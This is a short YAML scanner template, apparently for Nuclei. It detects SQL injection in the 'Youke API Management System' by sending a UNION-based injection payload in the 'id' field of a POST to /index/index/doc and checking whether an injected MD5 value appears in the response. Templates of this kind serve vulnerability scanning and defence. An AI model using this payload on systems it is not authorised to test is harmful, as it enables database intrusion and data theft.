id: poc-yaml-youke-api-management-system-doc-sqli
info:
  name: Youke API Management System SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/index/index/doc"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(md5({{t1}}) AS NCHAR),0x20)),NULL-- -"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "返回数据"
          - "请求参数"
          - "API"
          - "{{t2}}"
      - type: status
        status:
          - 200
